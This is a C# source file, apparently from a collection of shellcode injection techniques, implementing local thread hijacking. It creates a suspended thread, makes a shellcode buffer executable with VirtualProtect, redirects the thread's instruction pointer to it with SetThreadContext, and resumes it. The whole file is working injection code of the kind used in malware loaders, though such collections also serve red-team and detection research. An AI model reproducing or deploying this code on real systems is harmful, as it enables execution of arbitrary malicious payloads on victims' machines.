using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;
using static ShellcodeInjectionTechniques.Native;

namespace ShellcodeInjectionTechniques
{
    class LocalThreadHijack : ITechnique
    {

        public void Run(Process target, byte[] shellcode)
        {
            // create a new thread to hijack, in a suspended state
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, ThreadCreationFlags.CREATE_SUSPENDED, out hThread);
            Debug("[+] CreateThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });

            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    // set the memory where the shellcode is to PAGE_EXECUTE_READWRITE
                    IntPtr memoryAddress = (IntPtr)ptr;
                    VirtualProtect(memoryAddress, (UIntPtr)shellcode.Length, MemoryProtection.PAGE_EXECUTE_READWRITE, out MemoryProtection lpfOldProtect);
                    Debug("[+] VirtualProtect() - set to PAGE_EXECUTE_READWRITE, shellcode address: 0x{0}", new string[] { memoryAddress.ToString("X") });

                    //CONTEXT_ALL = 0x10001F
                    CONTEXT64 ctx = new CONTEXT64();
                    ctx.ContextFlags = 0x10001F;

                    // get the thread context - we are looking to manipulate the instruction pointer register
                    Debug("[+] GetThreadContext() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
                    if (!GetThreadContext(hThread, ref ctx))
                    {
                        Console.WriteLine("[!] Error: {0}", GetLastError());
                        return;
                    }

                    Debug("[+] RIP is: 0x{0}", new string[] { ctx.Rip.ToString("X") });

                    // point the instruction pointer to our shellcode
                    ctx.Rip = (ulong)memoryAddress;

                    // set the thread context (update the registers)
                    Debug("[+] SetThreadContext(), RIP assigned: 0x{0}", new string[] { memoryAddress.ToString("X") });
                    SetThreadContext(hThread, ref ctx);
                }
            }

            Debug("[+] ResumeThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
            ResumeThread(hThread);
        }
    }
}
